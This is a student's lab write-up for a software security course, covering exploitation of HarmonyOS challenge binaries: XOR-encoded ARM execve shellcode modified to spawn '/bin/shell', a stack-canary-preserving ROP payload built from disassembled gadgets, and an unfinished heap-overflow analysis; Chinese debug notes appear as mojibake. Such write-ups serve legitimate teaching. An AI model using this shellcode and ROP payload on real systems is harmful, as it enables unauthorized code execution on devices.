<center><font size=7>ã€Šè½¯ä»¶å®‰å…¨ã€‹final</font></center><br /><div align='right'><font size=4><b>é™ˆå¸Œå°§</b> 3180103012</font></div>

[TOC]

# Lab

## 01_harmshell

### Exploit

Using the modified harmony example which use shell as the boot program:

```shell
OHOS # ls /bin
Directory /bin:
-rwxrwx--- 25828    u:0     g:999   init      
-rwxrwx--- 25824    u:0     g:999   shell     
-rwxrwx--- 50484    u:0     g:999   bundle_daemon
-rwxrwx--- 13540    u:0     g:999   query.bin 
-rwxrwx--- 13440    u:0     g:999   foundation
-rwxrwx--- 13540    u:0     g:999   media_server
-rwxrwx--- 21724    u:0     g:999   appspawn  
-rwxrwx--- 25924    u:0     g:999   wms_server
-rwxrwx--- 13540    u:0     g:999   abilityMain
-rwxrwx--- 13488    u:0     g:999   camera_app
-rwxrwx--- 13792    u:0     g:999   hilogcat  
-rwxrwx--- 13488    u:0     g:999   apphilogcat
```

We can found that the shell is `/bin/shell` instead of `/bin/sh`. So we can modify an existing shellcode's "/bin/sh" to "/bin/shell" and crack the target.

```python
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68";
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf/bin/sh";
shellcode = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf/bin/shell";
```

Then, since the camera_app has use a xor key to decode the payload, we need to encode the shellcode first

```c
void readstring(char *out) {
    char tmp;
    unsigned int i = 0;
    do {
        read(0, &tmp, 1);
        if (tmp == '\n') {
            out[i] = '\x00';
        } else {
            tmp    = tmp ^ key[0];
            out[i] = tmp;
        }
        i++;
    } while (tmp != '\n');
}
```

As we all know, `a ^ key ^ key == a`, so we just do a bit-wide xor to the shellcode:

```python
key = 0xaa
shellcode_xor = b""

for i in shellcode:
    shellcode_xor += (i ^ key).to_bytes(1, 'little')
```

Thus we get the shell.

<img src="assets/image-20210701164736155.png" style="zoom:50%;" />

### Debug

1. harmshellä¸èƒ½ç”¨recvè€Œæ˜¯è¦ç”¨recvuntilï¼Œå› ä¸ºé¸¿è’™å¯åŠ¨éœ€è¦æ—¶é—´ï¼Œè¿™ä¸ªæ—¶é—´ä¼šè¶…è¿‡recvçš„timeoutï¼Œå› æ­¤è¿˜æ²¡è¿›å…¥camera_appï¼Œå‘é€çš„shellcodeæ˜¯æ— æ•ˆçš„
2. é™¤æ­¤ä¹‹å¤–ï¼Œè¿™æ¬¡çš„ç¯å¢ƒä¸æ˜¯Linuxï¼Œä½¿ç”¨çš„æ˜¯CRLFï¼Œå› æ­¤è¿”å›å€¼æ˜¯"give me something to get shell!\\r\\r\\n"è€Œä¸æ˜¯"give me something to get shell!\\n"
3. ä¸æ˜¯æ‰€æœ‰shellcodeéƒ½æ˜¯èƒ½ç”¨çš„ï¼Œæˆ‘å°è¯•çš„ä¸‰ç§shellcodeä¸­ï¼Œåªæœ‰[Linux/ARM - execve(/bin/sh,NULL,0) - 31 bytes (shell-storm.org)](http://shell-storm.org/shellcode/files/shellcode-696.php)å’Œ[Linux/ARM - execve(/bin/sh, [0\], [0 vars]) - 27 bytes (shell-storm.org)](http://shell-storm.org/shellcode/files/shellcode-698.php)æ˜¯å¯ä»¥çš„ï¼Œ[Linux/ARM - execve("/bin/sh", NULL, 0) - 34 bytes (shell-storm.org)](http://shell-storm.org/shellcode/files/shellcode-904.php)æ˜¯æ— æ•ˆçš„ï¼Œæ„Ÿè§‰æ˜¯å› ä¸ºç¬¬ä¸‰ä¸ªç”¨çš„æ˜¯æ‹¼æ¥"/bin"å’Œ"/sh"çš„æ–¹æ³•ï¼Œå› æ­¤æ”¹æˆ"/bin/shell"åä¼šå‡ºç°é—®é¢˜
4. "/etc/flag.exe"ä¼šcommand not foundï¼Œå¾—å…ˆcdå†æ‰§è¡Œ

## 02_harmrop

### Stage 1: hijack control flow

Use "arm-linux-gnueabi-objdump" (binutils-arm-gnueabi) to disassemble the binary.

Find the `gift` in the assembly source with the help of `pwn.ELF`

```assembly
1154:	e92d4c1c 	push	{r2, r3, r4, sl, fp, lr}
1158:	e28db010 	add	fp, sp, #16

# printf("[ ] ...look at here");
116c:	e59f0048 	ldr	r0, [pc, #72]	; 11bc <_init-0x228>
1170:	e08f0000 	add	r0, pc, r0
1174:	eb0000b5 	bl	1450 <_fini+0x60>

# execve("/bin/ls\0", 0, 0);
1178:	e59f0040 	ldr	r0, [pc, #64]	; 11c0 <_init-0x224>
117c:	e3a01000 	mov	r1, #0
1180:	e3a02000 	mov	r2, #0
1184:	e08f0000 	add	r0, pc, r0
1188:	eb0000b4 	bl	1460 <_fini+0x70>

# __asm__ __volatile__();
118c:	e8bd000e 	pop	{r1, r2, r3}
1190:	e8bd8031 	pop	{r0, r4, r5, pc}
1194:	e8bd8007 	pop	{r0, r1, r2, pc}
1198:	e24dd010 	sub	sp, sp, #16
119c:	e49df004 	pop	{pc}		; (ldr pc, [sp], #4)
```

And also the `hear`

```assembly
11c4:	e92d4c10 	push	{r4, sl, fp, lr}
11c8:	e28db008 	add	fp, sp, #8
11cc:	e24dd028 	sub	sp, sp, #40	; 0x28
11d0:	e59f403c 	ldr	r4, [pc, #60]	; 1214 <_init-0x1d0>
11d4:	e79f4004 	ldr	r4, [pc, r4]

# puts("[ ] Now Reading:");
11d8:	e5940000 	ldr	r0, [r4]
11dc:	e50b000c 	str	r0, [fp, #-12]
11e0:	e59f0030 	ldr	r0, [pc, #48]	; 1218 <_init-0x1cc>
11e4:	e08f0000 	add	r0, pc, r0
11e8:	eb0000a4 	bl	1480 <_fini+0x90>

# read(STDIN_FILENO, buf, LEN + 0x14);
11ec:	e28d1004 	add	r1, sp, #4
11f0:	e3a00000 	mov	r0, #0
11f4:	e3a02034 	mov	r2, #52	; 0x34
11f8:	eb0000a4 	bl	1490 <_fini+0xa0> 

11fc:	e5940000 	ldr	r0, [r4]
1200:	e51b100c 	ldr	r1, [fp, #-12]
1204:	e0500001 	subs	r0, r0, r1
1208:	024bd008 	subeq	sp, fp, #8
120c:	08bd8c10 	popeq	{r4, sl, fp, pc}
```

Since the canary given is at the position of `smile`, to find the rule of it being held we need to find the functino body of `smile` in the assembly code.

...

But ğŸ‘† is toooo diffcult, so I turn to another solution.

Draw the stack struct of hear:

```
High Addr
        hear
 /                \
+------------------+
|      old lr      |
+------------------+
|      old fp      |
+------------------+ <-- fp
|      old sl      |
+------------------+
|      old r4      |
+------------------+ <-- sp + 0x28
|      canary      |
+------------------+
|                  |
|    buf[0:0x20]   |
|                  |
+------------------+ <-- sp + 0x4
 \                /
Low Addr
```

Since the only space left between the `buf` and the saved reg is the one-word space at `sp + 0x24`, and that is the only space that can be used to prevent BOF exploit. So it must be the canary.

So I try by modifying the return address to `printf` in `gift`:

```python
conn.sendline(b"a" * LEN + p32(canary) + b'a' * 12 + p32(gift_addr + printf_binaddr - gift_binaddr))
```

And get the ouput:

```c
// void gift(void) {
//     printf("[ ] ...look at here");
//     execve("/bin/ls\0", 0, 0);

//     __asm__ __volatile__("pop {r1, r2, r3}	\n\t"
//                          "pop {r0, r4, r5, pc}	\n\t"
//                          "pop {r0, r1, r2, pc}	\n\t"
//                          "sub sp, sp, #0x10  \n\t"
//                          "pop {pc} \n\t");

//     return;
// }
    00000030  e1 a2 02 0d  0a 0d 5b 20  5d 20 2e 2e  2e 6c 6f 6f  â”‚Â·Â·Â·Â·â”‚Â·Â·[ â”‚] ..â”‚.looâ”‚
    00000040  6b 20 61 74  20 68 65 72  65 5b 45 52  52 5d 4e 6f  â”‚k atâ”‚ herâ”‚e[ERâ”‚R]Noâ”‚
    00000050  20 73 75 63  68 20 66 69  6c 65 20 6f  72 20 64 69  â”‚ sucâ”‚h fiâ”‚le oâ”‚r diâ”‚
    00000060  72 65 63 74  6f 72 79 3a  20 2f 62 69  6e 2f 6c 73  â”‚rectâ”‚ory:â”‚ /biâ”‚n/lsâ”‚
    00000070  0d 0d 0a 5b  45 52 52 5d  4f 73 56 6d  50 61 67 65  â”‚Â·Â·Â·[â”‚ERR]â”‚OsVmâ”‚Pageâ”‚
```

This is just what we want.

### Stage 2: "/bin/shell"

Fisrt try finding "shell" in binary using `binary.search(b'shell')` but find nothing. Then I think we can use the payload to have the "/bin/shell" string.

```
High Addr
        hear 
 /                \               subsp
+------------------+       sp--> +----+
|  old lr(subsq)   |             |    |
+------------------+             +----+
|      old fp      |             |    |                               pop3
+------------------+ <--fp       +----+                          +------------+
|      old sl      |             |    |           subsp          |     pc     |
+------------------+             +----+ <--sp--> +----+          +------------+
|      old r4      |             | pc |          |    |          |     r2     |
+------------------+ <--sp+0x28  +----+          +----+          +------------+
|      canary      |                             |    |          |     r1     |
+------------------+                             +----+          +------------+
|                  |                             |    |          | r0(&binsh) |
|    buf[0:0x20]   |                             +----+ <--sp--> +------------+
|                  |                             | pc |
+------------------+ <--sp + 0x4                 +----+ buf[0x18]
 \                /
Low Addr
```

At first I think one `subsp` is enough, but the I found there is a `LEN+0x14` restriction of the read buffer length, so the payload can't exceed `old lr`, there fore we need to `subsp`s.

Then for the `pc` of  `pop {r0, r1, r2, pc}`, I use the real address of "/bin/shell" minus the real address of 0x11e4, since there is a `add	r0, pc, r0` at 0x11e4, we need to sub it first.

As for the computation of sp of `hear`, I use **brutal-force**. Since the stirng "/bin/shell" is wide enough, so I try range `[stack_addr - 0x80, stack_addr + 0x80, 0x8]` to see if any "command not found" hint is printed, and find the correct sp at `stack_addr - 0x40` .

And the fp must be set since execve needs it to maintain stack structure. Here old fp should be `sp + 0x30`.

Thus, the payload is constructed as follows:

```python
payload = b"/bin/shell".ljust(0x18, b'\0')
payload += p32(gift_offset + popr0_binaddr)
payload += p32(sp+4 - (gift_offset + addr0pc_binaddr))  # r0 of execve
payload += p32(canary)
payload += p32(gift_offset + subsp_binaddr)        # r4 = second subsq
payload += p32(gift_offset + execve_nor0_binaddr)  # sl = execve_nor0
payload += p32(sp + 0x30)                          # correct fp
payload += p32(gift_offset + subsp_binaddr)        # lr = first subsp
```

And get shell:

<img src="assets/image-20210702200322591.png" style="zoom:50%;" />

### Debug

1. ä¸€å¼€å§‹æƒ³è·å¾—hearçš„spæ˜¯ç”¨gdbè·å¾—çš„spå‡å»åŒä¸€æ¬¡è¿è¡Œæ—¶çš„prepareè¾“å‡ºè·å¾—offsetã€‚åæ¥å‘ç°å› ä¸ºæ²¡è®¾æ–­ç‚¹ï¼Œæ‰€ä»¥gdbè¾“å‡ºçš„spæ˜¯readå‡½æ•°çš„ä¸æ˜¯hearå‡½æ•°çš„ï¼Œå› æ­¤æ”¹æˆç”¨æ¨ç®—çš„
2. ä¸ºä»€ä¹ˆè¦ç”¨ä¸¤ä¸ªsubï¼šå› ä¸ºåªç”¨ä¸€ä¸ªçš„è¯`(&execve_nor0)`è¦å­˜åˆ°old lrä¸Šé¢å»ï¼Œè¿™æ ·è¶…å‡ºäº†readçš„bufferå¤§å°çš„é™åˆ¶
3. ä¸ºä»€ä¹ˆè¦ä»¥0x117cä½œä¸ºæ‰§è¡Œexecveçš„å…¥å£ï¼šè¿™æ ·æ—¢èƒ½ä¿è¯execveçš„r1å’Œr2å‚æ•°éƒ½æ˜¯0ï¼Œä¹Ÿèƒ½ä¿è¯r0èƒ½è¢«æˆ‘ä¿®æ”¹
    * é¢˜ç›®ç»™`pop {r0, r1, r2, pc}`è¿™ä¸ªgadgetçš„æœ¬æ„å¯èƒ½è¦è®©æˆ‘ä»¬æŠŠr0ã€r1ã€r2éƒ½ç”¨popçš„æ–¹å¼å¡«å†™ç„¶åç›´æ¥è°ƒç”¨`bl execve`ä½†æ˜¯è¿™æ ·å®åœ¨å¤ªéº»çƒ¦äº†
4. fpä¸èƒ½ä¸æ”¹ï¼Œä¸å¦‚execveå‡ºé—®é¢˜äº†ç¨‹åºç…§æ ·å´©æºƒ
5. æœ¬æ¥æ”¹äº†subspçš„canaryï¼Œåæ¥å‘ç°ä¸éœ€è¦ä¹Ÿæ²¡é—®é¢˜ï¼ŒçŒœæµ‹ç¨‹åºæ£€æŸ¥canaryæ˜¯é `__stack_chk_fail`çš„ï¼Œç›´æ¥ç”¨pop pcè·³è½¬çš„è¯ä¸éœ€è¦ä¿æŒcanary

## 03_harmheap

### Stage 1: find vulnerability

ç¨å¾®å°è¯•äº†ä¸€ä¸‹å‘ç°ï¼Œæ–°å»ºDDLçš„æ—¶å€™çš„sizeæ˜¯è§„å®šäº†æŸä¸ªå¤§å°ï¼Œå¹¶ä¸”åœ¨sizeè¾ƒå°æ—¶nameæˆ–contentç¨å¤§ä¸€ç‚¹ç¨‹åºå°±ä¼šç›´æ¥å´©æºƒï¼Œä½†æ˜¯å…·ä½“çš„è§„å¾‹å¹¶ä¸æ˜æ˜¾ã€‚

è¿›è¡Œä»¥ä¸‹æµ‹è¯•ï¼š

* size=1ï¼Œ\#name=1, \#content=1ä¸ä¼šçˆ†
* size=1ï¼Œ\#name=2, \#content=1ä¸ä¼šçˆ†
* size=1ï¼Œ\#name=1, \#content=2ä¼šçˆ†
* size=1ï¼Œ\#name=7, \#content=1ä¸ä¼šçˆ†
* size=1ï¼Œ\#name=8, \#content=1ä¼šçˆ†
* size=1ï¼Œ\#name=7, \#content=2ä¼šçˆ†

ç”±æ­¤å¯çŸ¥ç¨‹åºä¼šå…ˆåˆ©ç”¨`size`æ¥ä»heapé‡Œåˆ†é…ä¸€å—ç©ºé—´ç»™DDLï¼Œç„¶åå†ç”¨è¿™å—ç©ºé—´è¿›è¡Œå†™æ“ä½œï¼Œæ­¤å¤„å°±ä¼šå­˜åœ¨overflowçš„æ¼æ´ã€‚ä½†æ˜¯è¿™ä¸ªæ¼æ´å¹¶ä¸èƒ½è®©ç¨‹åºå´©æºƒï¼ˆä¸æ˜¾ç¤ºé¸¿è’™çš„logï¼‰ï¼Œè€Œåªæ˜¯è¿›å…¥äº†ä¸€ä¸ªæ‰“å°"Your choice: !!! invalid choice !!!"çš„æ­»å¾ªç¯ã€‚

åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæˆ‘è§‰å¾—ä»åº”ä½¿ç”¨hw4ä¸­çš„æ–¹æ³•ã€‚ç»å°è¯•ï¼ŒUAFæ˜¯ä¸èƒ½ç”¨çš„ï¼Œå› ä¸ºeditèƒ½ä¿®æ”¹å·²ç»“æŸçš„DDLçš„bugå·²ç»è¢«ä¿®å¤äº†ã€‚æ‰€ä»¥åº”è¯¥æ˜¯unsafe unlinkã€‚

### Stage 2: crash program

é¦–å…ˆå°è¯•ä½¿ç”¨UAFçš„æ–¹æ³•å»ä¿®æ”¹GOTè¡¨ï¼Œä½†æ˜¯é¸¿è’™ä¸­ä¼¼ä¹æ²¡æœ‰è¿™ç§GOTè¡¨çš„æ•°æ®ç»“æ„ã€‚

ä¸ä¼šå†™ã€‚

# Appendix

## Reference

[Linux/ARM - execve(/bin/sh, [0\], [0 vars]) - 27 bytes (shell-storm.org)](http://shell-storm.org/shellcode/files/shellcode-698.php)

[c - objdump: Can't use supplied machine MIPS - Stack Overflow](https://stackoverflow.com/questions/35498355/objdump-cant-use-supplied-machine-mips)

[ARM Instruction Set (iitd-plos.github.io)](https://iitd-plos.github.io/col718/ref/arm-instructionset.pdf)

[ARM Developer Suite Assembler Guide](https://developer.arm.com/documentation/dui0068/b/Thumb-Instruction-Reference/Thumb-memory-access-instructions/PUSH-and-POP)

[What `andcs` and `andeq` instructions mean? : embedded (reddit.com)](https://www.reddit.com/r/embedded/comments/la3pcm/what_andcs_and_andeq_instructions_mean/)

[malloc\src - musl - musl - an implementation of the standard library for Linux-based systems (musl-libc.org)](https://git.musl-libc.org/cgit/musl/tree/src/malloc)

